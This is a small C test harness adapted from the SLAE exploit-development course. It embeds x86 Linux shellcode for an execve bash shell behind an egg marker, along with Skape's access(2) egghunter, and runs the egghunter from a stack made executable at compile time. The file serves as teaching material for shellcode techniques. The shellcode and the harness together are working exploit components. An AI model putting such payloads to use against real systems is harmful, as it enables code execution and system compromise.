/*  
 egghunter_wrapper.c  
 gcc egghunter_wrapper.c -fno-stack-protector -z execstack -o egghunter_wrapper  
 Adapted C code from the SLAE course to test shellcode used to demonstrate the egghunter shellcode working
*/  
  
#include <stdio.h>  
#include <string.h>  
  
#define EGG "\x90\x50\x90\x50"  
  
// Execve shell from course, not called anywhere within program   
unsigned char secret[] = EGG EGG  
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";  
  
// Skape's egghunter: access(2)  
unsigned char egghunter[] =   

"\x31\xc9\x31\xd2\xf7\xe1\xbb\x91\x50\x90\x50\x4b\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";

 

int main()  
{  
    printf("Egghunter size: %d\n", strlen(egghunter));  
    int (*ret)() = (int(*)())egghunter;  
    ret();  
}  
